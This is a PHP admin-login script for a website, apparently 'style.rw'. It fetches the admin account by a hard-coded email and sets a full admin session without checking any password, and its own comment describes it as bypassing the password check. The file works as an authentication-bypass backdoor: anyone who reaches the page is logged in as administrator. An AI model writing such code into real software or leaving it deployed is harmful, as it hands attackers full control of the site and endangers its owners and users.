<?php
session_start();
require_once '../includes/config.php';
require_once '../includes/db.php';

// Direct login - bypasses password check
$email = 'admin@style.rw';

$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND role = 'admin'");
$stmt->execute([$email]);
$user = $stmt->fetch();

if ($user) {
    // Force login
    $_SESSION['admin_logged_in'] = true;
    $_SESSION['admin_id'] = $user['id'];
    $_SESSION['admin_name'] = $user['name'];
    $_SESSION['admin_role'] = $user['role'];
    
    header('Location: index.php');
    exit;
} else {
    echo "Admin user not found. Please create one.";
}
?>